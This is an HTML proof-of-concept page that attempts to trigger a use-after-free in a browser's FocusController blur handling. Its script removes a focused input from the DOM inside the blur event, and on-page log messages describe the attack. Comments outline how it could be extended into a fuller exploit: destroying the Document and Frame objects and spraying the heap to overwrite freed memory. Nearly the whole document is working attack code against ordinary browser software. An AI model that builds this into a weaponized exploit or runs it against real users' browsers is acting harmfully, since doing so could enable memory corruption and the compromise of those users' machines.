<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
</style>
</head>
<body>
<div id="log"></div>

<!-- The victim element that will hold focus -->
<input type="text" id="target" value="Click me, then click outside the window!">

<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== FOCUSCONTROLLER BLUR USE-AFTER-FREE ===", "info");
log("[*] Setting up the blur trap...", "info");

let input = document.getElementById("target");

// When the window loses focus, FocusController::dispatchEventsOnWindowAndFocusedElement
// runs. It grabs the focused element as a RAW POINTER and fires the blur event on it.
input.addEventListener("blur", () => {
    log("[!] BLUR EVENT CAUGHT! C++ is holding raw pointers on the stack!", "warn");
    log("[!] Destroying the document structure...", "hit");
    
    // We remove the element from the DOM.
    // In a real exploit, we might use document.open() or remove the iframe
    // to completely destroy the Document and Frame objects.
    input.remove();
    
    // Force garbage collection if possible, or spray the heap to overwrite the freed memory.
    // By the time this function returns, the C++ code will resume and try to fire
    // the windowEvent using the stale 'document' pointer!
    
    log("[*] Returning control to C++. Brace for impact!", "info");
});

// We need the user to focus the input, then blur the window (e.g. click the desktop or switch tabs).
// The vulnerability requires window-level focus changes.
input.addEventListener("focus", () => {
    log("[*] Input focused! Now click outside the browser window to trigger the window blur!", "warn");
});

// Alternative trigger: try to force it programmatically
setTimeout(() => {
    try {
        log("[*] Attempting programmatic trigger...", "info");
        input.focus();
        window.blur(); // Sometimes blocked by browsers, but worth a shot!
    } catch(e) {
        log("[-] Programmatic trigger failed: " + e.message, "info");
    }
}, 2000);
</script>
</body>
</html>
